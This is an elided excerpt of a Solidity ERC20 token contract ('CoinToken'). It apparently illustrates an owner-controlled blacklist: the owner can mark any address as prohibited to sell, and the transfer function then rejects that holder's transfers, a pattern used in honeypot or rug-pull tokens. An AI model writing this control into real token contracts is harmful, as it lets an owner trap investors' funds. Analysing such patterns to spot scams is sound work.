...
contract CoinToken is Context, IERC20, Ownable {
    ...
    mapping(address => bool) public _prohibitedToSell;
    ...
    function prohibitTransaction(address account) public onlyOwner {
        _prohibitedToSell[account] = true;
    }

    function allowTransaction(address account) public onlyOwner {
        _prohibitedToSell[account] = false;
    }
    ...
    function _transfer(
        ...
        require(!_prohibitedToSell[from], "ERC20: prohibited to sell");
